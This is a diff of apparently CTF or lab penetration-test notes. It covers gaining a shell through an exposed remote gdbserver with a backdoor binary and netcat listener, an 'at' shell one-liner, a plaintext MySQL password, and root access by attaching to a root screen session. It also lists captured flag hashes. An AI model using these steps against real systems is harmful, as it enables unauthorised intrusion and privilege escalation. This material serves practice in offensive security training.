@@ -78,7 +78,7 @@ gdb binary.elf
 gdb>target extended-remote 10.10.11.125:1337 #remote gdb target
 gdb>remote put binary.elf binary.elf #upload binary.elf
 gdb>set remote exec-file /home/user/binary.elf #remote exe. file
-gdb>run
+gdb>run #See ![](Screenshots/backdoor_after_run_gdb_elf.png)
 set up listener:: nc -lvnp 9999
 ```
 see ![serve_elf](Screenshots/backdoor_gdb_serve_elf.png)
@@ -94,10 +94,23 @@ user:: f8424547e0a469bd46d72cda45ff861f
   /usr/bin/mtr-packet = cap_net_raw+ep
   /usr/bin/traceroute6.iputils = cap_net_raw+ep
 
-TODO:: Capablities && possible exploit w/ sudo? GTFObins?
+Broken shells:
++-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at                                                              
+`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`                                                
+`mysql -u wordpressuser -p MQYBJSaD#DxG6qbm`
 
-https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
-https://vulmon.com/vulnerabilitydetails?qid=CVE-2002-1614
+Capablities??
+GTFObins:: no luck
+
+```
+ps aux | grep "screen"   
+root         870  0.0  0.0   2608  1728 ?        Ss   Jan27   0:27 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
+export TERM=xterm
+screen -x root/root
+```
+root:: 3faa65cadf9e930098a7786d3dc4ee44
+
+WIFI TODO: https://github.com/D35m0nd142/DWH
 
 [Linux Filesystem Hierarchy](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html)
 [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver)
